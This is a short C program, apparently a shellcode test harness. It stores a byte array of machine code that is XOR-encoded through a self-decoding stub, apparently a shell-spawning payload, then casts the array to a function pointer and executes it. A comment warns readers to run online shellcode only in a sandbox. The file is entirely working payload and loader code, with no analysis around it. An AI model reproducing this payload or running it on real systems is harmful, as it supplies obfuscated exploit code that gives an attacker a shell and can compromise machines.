#include <stdio.h>
#include <string.h>

/**
	REMEMBER THAT SHELLCODE FROM ONLINE IS NEVER TRUSTED, 
	ALWAYS RUN IT IN A VIRTUAL ENVIRONMENT AND NOT YOUR ACTUAL MACHINE
	AKA A TESTING SANDBOX 
*/



unsigned char code[] = \
"\xeb\x0b\x5e\x80\x36\xaa\x74\x0a\x48\xff\xc6\xeb\xf6\xe8\xf0\xff\xff\xff\xe2\x9b\x6a\xe2\x9b\x71\x1a\x91\xf9\xe2\x13\x85\xc8\xc3\xc4\x85\x85\xd9\xc2\xfb\xe2\x23\x4d\xf9\xfd\xe2\x23\x4c\xf9\xe2\x23\x48\xa5\xaf\xaa";


int main(int argc, char** argv)
{
	printf("Shellcode Length: %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

	return 0;
}
